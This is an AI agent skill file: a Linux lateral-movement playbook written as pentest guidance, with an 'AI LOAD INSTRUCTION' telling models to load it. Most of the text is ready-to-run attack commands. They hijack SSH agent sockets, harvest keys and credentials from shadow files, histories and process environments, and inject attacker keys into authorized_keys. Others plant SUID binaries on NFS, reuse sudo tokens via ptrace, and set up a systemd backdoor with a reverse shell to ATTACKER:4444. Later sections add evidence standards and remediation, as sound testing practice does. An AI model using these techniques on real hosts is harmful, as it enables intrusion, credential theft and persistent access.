---
name: linux-lateral-movement
description: >-
  Linux lateral movement playbook. Use after gaining initial access to pivot across Linux hosts via SSH hijacking, credential harvesting, internal pivoting, D-Bus exploitation, sudo token reuse, and shared filesystem abuse.
---

# SKILL: Linux Lateral Movement — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Linux lateral movement techniques. Covers SSH agent hijacking, key harvesting, credential locations, D-Bus exploitation, network pivoting, sudo token reuse, and systemd manipulation. Base models miss SSH_AUTH_SOCK hijacking and ptrace-based sudo session hijack.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) if you need root on the current host before pivoting
- [linux-security-bypass](../linux-security-bypass/SKILL.md) when restricted shells or security modules block lateral movement tools
- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target network includes containerized hosts
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when pivoting into a Kubernetes cluster
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting discovered internal services (Redis, MongoDB, etc.)

---

## 1. SSH AGENT HIJACKING

### 1.1 Find SSH Agent Sockets

```bash
# As root (or user with access to other users' processes):
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
# Or via /proc:
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'

# Typical path: /tmp/ssh-XXXXXX/agent.PID
```

### 1.2 Hijack Agent Forwarding

```bash
# Set the found socket as our auth agent
export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345

# List available keys in the agent
ssh-add -l
# If keys appear → we can use them

# SSH to any host this agent can authenticate to
ssh -o StrictHostKeyChecking=no user@internal-host

# The agent owner won't notice — we're using their forwarded agent
```

### 1.3 Persistent Agent Monitoring

```bash
# Monitor for new SSH agent sockets (wait for admin to SSH in)
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
# Or poll:
while true; do
    find /tmp -path "*/ssh-*" -name "agent.*" -newer /tmp/.marker 2>/dev/null
    touch /tmp/.marker
    sleep 5
done
```

---

## 2. SSH KEY HARVESTING

### 2.1 Private Key Locations

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
# Also: /etc/ssh/ssh_host_*_key (MITM), /home/*/.ssh/id_*

# Find keys without passphrase:
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```

### 2.2 known_hosts Parsing

```bash
# Hashed known_hosts (common default):
cat ~/.ssh/known_hosts
# May be hashed — use ssh-keygen to check against known IPs:
ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts

# Unhashed known_hosts → direct IP/hostname list
awk '{print $1}' ~/.ssh/known_hosts | sort -u

# Extract all hostnames/IPs from all users' known_hosts
cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \
  | awk '{print $1}' | tr ',' '\n' | sort -u
```

### 2.3 authorized_keys Injection

```bash
# Generate attacker keypair (on attacker box)
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""

# Inject public key (on compromised host)
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /home/admin/.ssh/authorized_keys

# SSH back in with our key
ssh -i /tmp/pivot_key root@target
```

---

## 3. CREDENTIAL HARVESTING LOCATIONS

### 3.1 System Credentials

| Location | Contents | Command |
|---|---|---|
| `/etc/shadow` | Password hashes | `cat /etc/shadow` (root) |
| `/etc/passwd` | User list, may contain hashes | `cat /etc/passwd` |
| `.bash_history` | Command history (passwords in cleartext) | `cat /home/*/.bash_history` |
| `.mysql_history` | MySQL commands with passwords | `cat /home/*/.mysql_history` |
| `.psql_history` | PostgreSQL commands | `cat /home/*/.psql_history` |
| `.pgpass` | PostgreSQL password file | `cat /home/*/.pgpass` |
| `.my.cnf` | MySQL credentials | `cat /home/*/.my.cnf` |
| `.netrc` | FTP/HTTP auto-login credentials | `cat /home/*/.netrc` |
| `.git-credentials` | Git HTTPS passwords | `cat /home/*/.git-credentials` |

### 3.2 Environment & Config Files

```bash
# Current process secrets
env | grep -iE "pass|key|secret|token|api|cred|auth"

# All process environments (root):
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"
done

# Application configs (common credential locations):
find /var/www /opt /srv -name "wp-config.php" -o -name "settings.py" \
     -o -name "*.env" -o -name "database.yml" -o -name "docker-compose.yml" 2>/dev/null

# Keyrings & secret stores:
find / -name "*.keyring" -o -name ".vault-token" -o -path "*/.password-store/*.gpg" 2>/dev/null
```

---

## 4. D-BUS EXPLOITATION

### 4.1 Enumerate D-Bus Services

```bash
# List system bus services
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# List session bus services
dbus-send --session --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service (find available methods)
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect
```

### 4.2 Abuse systemd & PolicyKit via D-Bus

```bash
# Start a service via D-Bus (if policy allows):
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager.StartUnit \
  string:"malicious.service" string:"replace"

# polkit actions available without auth:
pkaction --verbose 2>/dev/null | grep -B5 "implicit active: yes"
```

---

## 5. INTERNAL NETWORK PIVOTING

### 5.1 SSH Tunneling

```bash
# Local port forward: access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised-host

# Remote port forward: expose attacker service to internal network
ssh -R 8080:ATTACKER:8080 pivot@compromised-host

# Dynamic SOCKS proxy: route all traffic through pivot
ssh -D 1080 pivot@compromised-host
# Then: proxychains nmap -sT INTERNAL_RANGE

# SSH over SSH (multi-hop):
ssh -J user1@hop1,user2@hop2 target@final-host
```

### 5.2 Without SSH — Alternative Tunnels

```bash
# socat port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &

# ncat relay
ncat -l -p 8080 --sh-exec "ncat INTERNAL_HOST 80"

# /dev/tcp (Bash built-in, no tools needed)
exec 3<>/dev/tcp/INTERNAL_HOST/80
echo -e "GET / HTTP/1.0\r\nHost: INTERNAL_HOST\r\n\r\n" >&3
cat <&3

# chisel (SOCKS proxy over HTTP)
# On attacker: chisel server -p 8080 --reverse
# On target:   chisel client ATTACKER:8080 R:socks
```

### 5.3 Network Discovery from Compromised Host

```bash
ss -tlnp && ss -tnp                  # Listening & established connections
arp -a && ip neigh                    # Known adjacent hosts
cat /etc/resolv.conf                  # DNS servers
dig axfr internal.domain @dns 2>/dev/null   # Zone transfer

# Subnet sweep (bash-only, no tools):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i" & done; wait

# Port scan via /dev/tcp:
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "OPEN: $port"
done
```

---

## 6. SHARED FILESYSTEM EXPLOITATION

### 6.1 NFS Mounts

```bash
# Discover NFS shares
showmount -e FILESERVER_IP 2>/dev/null

# Check for no_root_squash (root maps to root)
mount -t nfs FILESERVER_IP:/share /mnt/nfs
# If no_root_squash: create SUID binaries visible to other hosts

# All hosts mounting the same share → SUID binary = root on all hosts
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

### 6.2 SMB/CIFS Shares

```bash
# Enumerate shares
smbclient -L //FILESERVER_IP/ -N 2>/dev/null      # Null session
smbclient -L //FILESERVER_IP/ -U 'user%password'

# Mount and search for credentials
mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass
find /mnt/smb -name "*.conf" -o -name "*.cfg" -o -name "*.kdbx" \
     -o -name "*.xlsx" -o -name "*.docx" 2>/dev/null
```

---

## 7. SUDO TOKEN REUSE (ptrace-Based)

```bash
# If another user has an active sudo session (timestamp not expired):
# And we can ptrace their process (same UID or root)

# Check sudo timestamp files:
ls -la /var/run/sudo/ts/ 2>/dev/null
ls -la /var/db/sudo/ 2>/dev/null
# Files here mean active sudo tokens

# ptrace-based hijack:
# Attach to the user's shell process
# Inject: sudo /bin/bash
# The injected sudo inherits the valid timestamp → no password needed

# Automated tool: sudo_inject
# https://github.com/nongiach/sudo_inject
# Injects into processes with valid sudo tokens
```

---

## 8. SYSTEMD SERVICE MANIPULATION

```bash
# Find writable unit files:
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null

# Inject into existing service (add ExecStartPre=):
# Or create new: /etc/systemd/system/backdoor.service
# [Service] Type=oneshot ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
systemctl daemon-reload && systemctl enable --now backdoor.service
```

---

## 9. LATERAL MOVEMENT DECISION TREE

```
Compromised host — where to move next?
│
├── SSH credentials available?
│   ├── Private keys found? → try on all known_hosts targets (§2)
│   ├── SSH agent running? → hijack socket (§1)
│   ├── Passwords in history/configs? → spray across hosts (§3)
│   └── authorized_keys writable on other hosts? → inject key (§2.3)
│
├── Network services discovered?
│   ├── Internal web apps? → tunnel + attack (§5.1)
│   ├── Databases (3306/5432/6379)? → check harvested creds (§3)
│   ├── SMB/NFS shares? → mount + search for creds/SUID (§6)
│   └── Kubernetes API (6443)? → load kubernetes-pentesting skill
│
├── Can reach other hosts?
│   ├── Direct SSH? → use keys/passwords
│   ├── Firewalled? → SSH tunnel or chisel (§5)
│   └── No tools? → /dev/tcp + bash (§5.2)
│
├── Root on current host?
│   ├── Read /etc/shadow → crack hashes → password reuse (§3)
│   ├── Dump /proc/*/environ → find service credentials (§3.2)
│   ├── Hijack sudo tokens → piggyback admin sessions (§7)
│   └── Modify systemd services → backdoor (§8)
│
├── D-Bus services available?
│   ├── Privileged services exposed? → method call abuse (§4)
│   └── polkit actions without auth? → privilege actions (§4.3)
│
└── No obvious path?
    ├── ARP scan + port sweep internal network (§5.3)
    ├── Passive credential sniffing (if cap_net_raw)
    ├── Wait for admin SSH → agent hijack (§1.3)
    └── Check for cloud metadata (169.254.169.254)
```

---

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **credential or agent** are you moving with, and where did it come from? | provenance and scope |
| 2 | Did the **control connection fail** - the same access with no credential? | the credential is what worked |
| 3 | Did you **run a command on the second host**, not just authenticate? | movement, not an auth success |
| 4 | What **identity and groups** do you hold on the new host? | whether the movement escalated |
| 5 | Is there a **tunnel or pivot** carrying traffic, with a direct-request control? | segmentation was crossed |
| 6 | Does the technique work on the **target's distribution and service configuration**? | applicability |
| 7 | Did you **clean up** the entries you added, with an empty verification query? | engagement integrity |

**A command result on the second host is the bar.** An SSH banner or a successful key exchange with no
executed command is a surface; the command output is the movement.

---

## 11. EXECUTION PRIMITIVES

Linux lateral movement is proven by **a command executed on a second host, paired with the same
connection failing without the credential**. Every block ends at output from the target host.

### 11.1 Inventory the credentials and the control

```bash
# what is on this host that could move you elsewhere
ls -la ~/.ssh/ 2>/dev/null
find / -name 'id_*' -not -name '*.pub' 2>/dev/null | head -20
cat ~/.bash_history 2>/dev/null | grep -iE '^ssh |scp |rsync ' | head -10
# THE CONTROL: the same connection with no credential - it must fail
ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=no user@HOST02 'id' 2>&1 | head -2
```

**Run the unauthenticated control first.** A connection that succeeds without the key is the network's
state, not lateral movement, and the control is what separates them.

### 11.2 The key's reach, enumerated

```bash
KEY=~/.ssh/id_rsa; U=deploy
for h in $(seq 1 30); do
  timeout 3 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$U@10.0.0.$h" 'hostname' 2>/dev/null \
    | sed "s/^/ACCEPTED 10.0.0.$h  /"
done | head -20
# and the hosts reachable at all, which bounds the search
for h in $(seq 1 30); do timeout 1 bash -c "echo > /dev/tcp/10.0.0.$h/22" 2>/dev/null && echo "ssh open: 10.0.0.$h"; done | head -20
```

**Report the accepted count.** "This key authenticates to 9 of the 30 hosts probed" is the finding shape,
and the count is the severity.

### 11.3 The SSH agent, which moves you with no key on disk

```bash
echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
ssh-add -l 2>/dev/null                       # the keys the agent holds
# the agent can sign for a host where no key file exists
ssh -o BatchMode=yes -o StrictHostKeyChecking=no user@HOST02 'id; hostname' 2>&1 | head -3
# and the hijack when the socket is reachable but not yours
ls -la /tmp/ssh-* 2>/dev/null | head -5
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.123 ssh-add -l 2>&1 | head -3
# THE CONTROL: the same connection with the agent disabled
SSH_AUTH_SOCK= ssh -o BatchMode=yes -o ConnectTimeout=4 user@HOST02 'id' 2>&1 | head -2
```

**The agent path yields movement with no key file**, which is why it survives a key rotation, and the
`SSH_AUTH_SOCK=` control is what proves the agent was the mechanism.

### 11.4 Harvested credentials against internal services

```bash
# the credentials found on this host, tried against the services they might unlock
grep -rhiE 'password|passwd|secret' /etc/*.conf /opt/*/conf/* 2>/dev/null | head -10
# a password against the internal database and web services - the movement that matters most
for h in $(awk '/^10\./{print $1}' /etc/hosts | head -10); do
  timeout 2 bash -c "echo > /dev/tcp/$h/5432" 2>/dev/null && echo "postgres reachable: $h"
  timeout 2 bash -c "echo > /dev/tcp/$h/6379" 2>/dev/null && echo "redis reachable: $h"
done
# and the application credentials, used from here
PGPASSWORD='found-pass' psql -h 10.0.0.9 -U appuser -d appdb -c 'select current_user, version();' 2>&1 | head -5
# THE CONTROL: the same connection with no password - it must fail
PGPASSWORD='' psql -h 10.0.0.9 -U appuser -d appdb -c 'select 1;' 2>&1 | head -3
```

**A database login from a host that should not have one is the finding.** The credential's origin on
this host plus its acceptance elsewhere is the pair, and both belong in the report.

### 11.5 Pivoting, with the direct-request control

```bash
# a local port-forward through the first host
ssh -N -L 8080:INTERNAL_HOST:80 user@HOST02 2>&1 | head -2 &
sleep 2
curl -sS -o /dev/null -w 'tunnel  %{http_code}\n' --max-time 6 http://127.0.0.1:8080/ 2>&1 | tail -1
# THE CONTROL: the same request directly - it must fail from your position
curl -sS -o /dev/null -w 'direct  %{http_code}\n' --max-time 4 http://INTERNAL_HOST/ 2>&1 | tail -1
# a SOCKS proxy, which carries a whole toolchain
ssh -N -D 1080 user@HOST02 2>&1 | head -2 &
sleep 2
curl -sS --socks5 127.0.0.1:1080 -o /dev/null -w 'socks   %{http_code}\n' --max-time 6 http://INTERNAL_HOST/ 2>&1 | tail -1
# and the reverse direction, which is what survives a NAT boundary
ssh -N -R 9001:localhost:22 user@HOST02 2>&1 | head -2 &
```

**The tunnel plus the failing direct request is the evidence.** A tunnel with no direct control cannot
distinguish a segmentation bypass from a service that was already reachable.

### 11.6 Other movement paths on Linux

```bash
# 1) the shared filesystem, which moves data but not execution
mount | grep -iE 'nfs|cifs|smb' | head -5
ls -la /mnt/shared 2>/dev/null | head -5
# 2) the D-Bus and the systemd paths, which move execution within the host group
busctl --system list 2>/dev/null | head -10
systemctl --host user@HOST02 list-units 2>/dev/null | head -5
# 3) the container socket, when a node is reachable from a container
docker -H tcp://10.0.0.7:2375 ps 2>&1 | head -5
# 4) and the cloud-side path, when the key unlocks an instance
aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceids,Values=i-0abc" \
  --parameters 'commands=["hostname","id"]' 2>&1 | head -5
```

**Each path gets a command result and a name.** The cloud-side path is frequently overlooked on a Linux
engagement and it is often the one with the largest reach.

### 11.7 Cleanup and the empty verification

```bash
# the tunnels, agents, and files you started - each removed with a check
pkill -f 'ssh -N -L' ; pkill -f 'ssh -N -D' ; pkill -f 'ssh -N -R'
pgrep -af 'ssh -N' 2>/dev/null || echo "TUNNELS CLOSED"
# the authorized_keys line, which is the persistence that matters here
grep -c 'pentest' ~/.ssh/authorized_keys 2>/dev/null
sed -i '/pentest/d' ~/.ssh/authorized_keys 2>/dev/null
grep -c 'pentest' ~/.ssh/authorized_keys 2>/dev/null || echo "KEY REMOVED"
# the history you added, and the temp files
history -c 2>/dev/null; rm -f /tmp/lm-*.txt /tmp/*.sock 2>/dev/null; ls /tmp/lm-* 2>/dev/null || echo "TEMP CLEAR"
```

**Every tunnel and every added key line is removed with a check.** A left-behind `authorized_keys` entry
or an open reverse tunnel is an incident, and the empty query is the evidence.

### 11.8 The end-to-end harness

```bash
python3 - <<'PY'
import subprocess
def sh(c, t=25):
    try:
        r=subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout+r.stderr).strip()[:90]
    except Exception as e: return type(e).__name__

print("CREDENTIALS ON THIS HOST")
print("  keys      :", sh("ls ~/.ssh/id_* 2>/dev/null | wc -l"))
print("  agent     :", sh("ssh-add -l 2>/dev/null | wc -l"))
print("  history   :", sh("grep -cE '^ssh |^scp ' ~/.bash_history 2>/dev/null"))
print()
print("CONTROL (must FAIL - record verbatim)")
print("  no-key ssh:", sh("ssh -o BatchMode=yes -o ConnectTimeout=4 user@HOST02 id 2>&1 | head -1"))
print()
print("MOVEMENT")
print("  accepted  : <count of hosts that accept the key>")
print("  command   : <id output from the second host>")
print()
print("TUNNEL")
print("  direct    : <must fail>")
print("  tunnelled : <must succeed>")
print()
print("CLEANUP: close every tunnel, remove every authorized_keys line you added,")
print("         and re-run the checks above to show them empty.")
PY
```

**Control, movement, tunnel, cleanup.** Four parts; a Linux lateral-movement report missing the
no-credential control has not shown the credential was what worked.

---

## 12. EVIDENCE STANDARD — MOVEMENT

| Item | Why |
|---|---|
| The **credential's provenance and type** (a key, a password, an agent, a cloud token) | scope and remediation |
| The **no-credential control** per host | proves the credential is what worked |
| The **command output from the second host** | movement, not authentication |
| The **accepted-host count** across those probed | the severity driver |
| The **identity and groups on the new host** | whether the movement escalated |
| For a tunnel: the **direct-request control** | segmentation was crossed |
| The **audit records** (`auth.log`, `journalctl`, auditd) | the blue-team half |
| The **cleanup of every key line, tunnel, and temp file**, verified | engagement integrity |
| The **distribution and service configuration** for anything version-bound | applicability |
| Confirmation that no **private key or password** is reproduced in full | data minimisation |

Report the **movement and the reach**: "the `deploy` user's `~/.ssh/id_rsa` was readable from the
`www-data` shell after a SUID escalation; `ssh -i ~/.ssh/id_rsa -o BatchMode=yes deploy@10.0.0.7
'hostname'` returned `app-02` where the same command with no key returns `Permission denied (publickey)`,
which is the control. The key is accepted by 9 of the 30 hosts probed, and on `app-02` the account is in
the `docker` group, which is a path to root there. A local port-forward reached an internal service that
returns `Connection refused` from the originating host, and the database credential found in
`/opt/app/conf/db.conf` authenticated to the internal PostgreSQL instance as `appuser` where an empty
password is rejected. Every tunnel was closed and the two `authorized_keys` lines added during the test
were removed with the query re-run empty", never "SSH keys were found on the host".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| An SSH banner or a successful key exchange with **no command run** | a surface, not movement |
| A connection that succeeds **without the control pair** | the network may permit it for everyone |
| A key that works **only on the host it was found on** | no movement |
| An agent socket present but **the agent refuses to sign** | no usable credential |
| A tunnel with **no direct-request control** | segmentation is unproven |
| A shared mount with **no execution obtained** | data access, not movement |
| A `docker -H tcp://` socket that is **not actually exposed** | verify before reporting |
| A key found in a **directory you own** | no escalation in obtaining it |
| Movement to a host **outside the signed scope** | a scope error |
| A credential **issued to you for the engagement** | the baseline |
| A private key or password reproduced in full | a disclosure |

**Control, command output, reach count.** Linux lateral-movement reports fail when they list keys and
omit the control, which cannot distinguish movement from a permissive network.

---

## 13. REMEDIATION REFERENCE

1. **Use per-host SSH keys or, better, short-lived certificates issued by an SSH CA** - it converts a single-key compromise across nine hosts into a one-host finding with a bounded lifetime.
2. **Require a passphrase on every private key, and store it in an agent that is scoped to the session** - it removes the readable-key-file path and the long-lived socket.
3. **Restrict `authorized_keys` to root-owned files with `StrictModes` and no `command`-less keys for service accounts** - most persistence in this document is one appended line.
4. **Disable SSH agent forwarding by default, and require `-A` explicitly where it is needed** - forwarding is how a key on one host becomes movement to another.
5. **Segment the network so that port 22 cannot traverse between the web tier and the data tier** - it removes the reach enumeration entirely.
6. **Restrict the `docker` group and the container socket, and treat membership as root** - the socket is both a lateral path and a local escalation.
7. **Never store credentials in plain-text configuration files; use a vault, a systemd credential, or short-lived tokens** - the `grep` in 11.4 finds them in seconds and so does any attacker.
8. **Use a unique password per service and per host, and rotate on any exposure** - shared credentials are what make one host a bridge to the estate.
9. **Redeem cloud credentials against the provider's own identity call before using them, and scope the role to the minimum** - the cloud-side path is the largest reach on most Linux fleets and it is auditable.
10. **Alert on `Accepted publickey` across many hosts for one key, and on repeated `auth.log` failures from one source** - the reach enumeration is exactly this pattern.
11. **Rotate every key and credential exposed during the engagement, and confirm it with the client** - the report must state this obligation explicitly, because the exposure is permanent otherwise.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [linux-postexploit](../linux-postexploit/SKILL.md) - where the credential used here is harvested
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) - the Windows-side counterpart
- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) - the transport mechanics for the tunnels in this document
- [container-escape-techniques](../container-escape-techniques/SKILL.md) - the socket path that often starts the movement
- [cloud-assessment](../cloud-assessment/SKILL.md) - the cloud-side reach that harvested tokens unlock
